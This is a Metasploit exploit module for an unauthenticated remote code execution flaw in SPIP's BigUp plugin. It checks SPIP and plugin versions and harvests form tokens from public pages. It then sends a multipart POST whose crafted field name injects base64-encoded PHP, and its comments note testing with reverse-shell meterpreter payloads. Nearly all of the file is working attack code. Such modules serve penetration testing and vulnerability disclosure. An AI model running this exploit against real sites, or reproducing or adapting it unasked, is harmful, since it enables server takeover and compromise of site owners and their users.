##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Payload::Php
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Spip
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SPIP BigUp Plugin Unauthenticated RCE',
        'Description' => %q{
          This module exploits a Remote Code Execution vulnerability in the BigUp plugin of SPIP.
          The vulnerability lies in the `lister_fichiers_par_champs` function, which is triggered
          when the `bigup_retrouver_fichiers` parameter is set to `1`. By exploiting the improper
          handling of multipart form data in file uploads, an attacker can inject and execute
          arbitrary PHP code on the target server.

          This critical vulnerability affects all versions of SPIP from 4.0 up to and including
          4.3.1, 4.2.15, and 4.1.17. It allows unauthenticated users to execute arbitrary code
          remotely via the public interface. The vulnerability has been patched in versions
          4.3.2, 4.2.16, and 4.1.18.
        },
        'Author' => [
          'Vozec', # Vulnerability Discoverer
          'Laluka', # Vulnerability Discoverer
          'Julien Voisin', # Code Review
          'Valentin Lobstein' # Metasploit Module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-2-SPIP-4-2-16-SPIP-4-1-18.html']
        ],
        'Platform' => %w[php unix linux win],
        'Arch' => [ARCH_PHP, ARCH_CMD],
        'Targets' => [
          [
            'PHP In-Memory', {
              'Platform' => 'php',
              'Arch' => ARCH_PHP
              # tested with php/meterpreter/reverse_tcp
            }
          ],
          [
            'Unix/Linux Command Shell', {
              'Platform' => %w[unix linux],
              'Arch' => ARCH_CMD
              # tested with cmd/linux/http/x64/meterpreter/reverse_tcp
            }
          ],
          [
            'Windows Command Shell', {
              'Platform' => 'win',
              'Arch' => ARCH_CMD
              # tested with cmd/windows/http/x64/meterpreter/reverse_tcp
            }
          ]
        ],
        'DefaultTarget' => 0,
        'Privileged' => false,
        'DisclosureDate' => '2024-09-06',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options(
      [
        OptString.new('FORM_PAGE', ['false', 'A page with a form.', 'Auto'])
      ]
    )
  end

  def check
    rversion = spip_version
    return Exploit::CheckCode::Unknown('Unable to determine the version of SPIP') unless rversion

    print_status("SPIP Version detected: #{rversion}")

    vulnerable_ranges = [
      { start: Rex::Version.new('4.0.0'), end: Rex::Version.new('4.1.17') },
      { start: Rex::Version.new('4.2.0'), end: Rex::Version.new('4.2.15') },
      { start: Rex::Version.new('4.3.0'), end: Rex::Version.new('4.3.1') }
    ]

    vulnerable_ranges.each do |range|
      if rversion.between?(range[:start], range[:end])
        print_status('SPIP version is in the vulnerable range.')
        break
      end
    end

    plugin_version = spip_plugin_version('bigup')

    unless plugin_version
      print_warning('Could not determine the version of the bigup plugin.')
      return Exploit::CheckCode::Appears("The detected SPIP version (#{rversion}) is vulnerable.")
    end

    return Exploit::CheckCode::Appears("The detected SPIP version (#{rversion}) and bigup version (#{plugin_version}) are vulnerable.") if plugin_version < Rex::Version.new('3.1.6')

    CheckCode::Safe("The detected SPIP version (#{rversion}) is not vulnerable.")
  end

  def get_form_data
    pages = []

    form_page = datastore['FORM_PAGE']
    pages << form_page if form_page && form_page.downcase != 'auto'

    pages.concat(%w[login spip_pass contact]) if pages.empty?

    pages.each do |page|
      url = normalize_uri(target_uri.path, page.start_with?('/') ? page : "spip.php?page=#{page}")
      res = send_request_cgi('method' => 'GET', 'uri' => url)

      next unless res&.code == 200

      doc = Nokogiri::HTML(res.body)
      action = doc.at_xpath("//input[@name='formulaire_action']/@value")&.text
      args = doc.at_xpath("//input[@name='formulaire_action_args']/@value")&.text

      next unless action && args

      print_status("Found formulaire_action: #{action}")
      print_status("Found formulaire_action_args: #{args}")
      return { action: action, args: args }
    end

    nil
  end

  def php_exec_cmd(encoded_payload)
    vars = Rex::RandomIdentifier::Generator.new
    dis = "$#{vars[:dis]}"
    encoded_clean_payload = Rex::Text.encode_base64(encoded_payload)
    <<-END_OF_PHP_CODE
            #{php_preamble(disabled_varname: dis)}
            $c = base64_decode("#{encoded_clean_payload}");
            #{php_system_block(cmd_varname: '$c', disabled_varname: dis)}
    END_OF_PHP_CODE
  end

  def exploit
    form_data = get_form_data

    unless form_data
      fail_with(Failure::NotFound, 'Could not retrieve formulaire_action or formulaire_action_args value from any page.')
    end

    print_status('Preparing to send exploit payload to the target...')

    phped_payload = target['Arch'] == ARCH_PHP ? payload.encoded : php_exec_cmd(payload.encoded)
    b64_payload = framework.encoders.create('php/base64').encode(phped_payload).gsub(';', '')

    post_data = Rex::MIME::Message.new

    post_data.add_part(form_data[:action], nil, nil, 'form-data; name="formulaire_action"')
    post_data.add_part('1', nil, nil, 'form-data; name="bigup_retrouver_fichiers"')
    post_data.add_part('', nil, nil, "form-data; name=\"#{Rex::Text.rand_text_alphanumeric(4, 8)}['.#{b64_payload}.die().']\"; filename=\"#{Rex::Text.rand_text_alphanumeric(4, 8)}\"")
    post_data.add_part(form_data[:args], nil, nil, 'form-data; name="formulaire_action_args"')

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'spip.php'),
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'data' => post_data.to_s
    }, 1)
  end
end
